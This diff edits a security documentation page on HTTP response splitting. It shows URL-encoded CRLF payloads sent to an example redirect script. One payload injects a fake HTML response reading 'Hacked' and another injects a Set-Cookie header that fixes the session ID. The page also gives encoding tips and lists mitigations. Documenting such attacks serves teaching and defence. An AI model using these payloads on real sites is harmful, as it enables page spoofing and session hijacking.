@@ -19,22 +19,19 @@ Normal send request:
 
     http://example.org/redirect.php?url=http%3A%2F%2Fexample.org%2Ftarget.php
 
-The response generated:
+A browser receiving this response transparently requests the new resource (indicated in the Location header), and it 
+is the response to this second request that is actually rendered in the browser:
     
     HTTP/1.1 302 Found
     Server: Apache/1.3.33 (Debian GNU/Linux)
     Location: http://example.org/target.php
     Content-Length: 0
 
-A browser receiving this response transparently requests the new resource (indicated in the Location header), and it 
-is the response to this second request that is actually rendered in the browser.
-
-So now attack with:
+So now you can attack with:
     
     http://example.org/redirect.php?url=http%3A%2F%2Fexample.org%2Ftarget.php%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0AContent-Length%3A+34%0D%0A%3Chtml%3E%3Cp%3EHacked%3C%2Fp%3E%3C%2Fhtml%3E
 
-Generates:
-
+And it generates:
 
     HTTP/1.1 302 Found
     Server: Apache/1.3.33 (Debian GNU/Linux)
@@ -49,6 +46,8 @@ Generates:
     Content-Length: 0
 
 ### Inject Set-Cookie header
+
+Or send:
 
     http://example.org/redirect.php?url=http%3A%2F%2Fexample.org%2Ftarget.php%0D%0ASet-Cookie%3A+PHPSESSID%3D1234
 
@@ -74,4 +73,4 @@ You may need to use url encoding, or double url encoding, etc.
 
 ## Mitigations
 
-* Sanitize input values
+* [Input validation](app-mitigations:docs/coding/input)
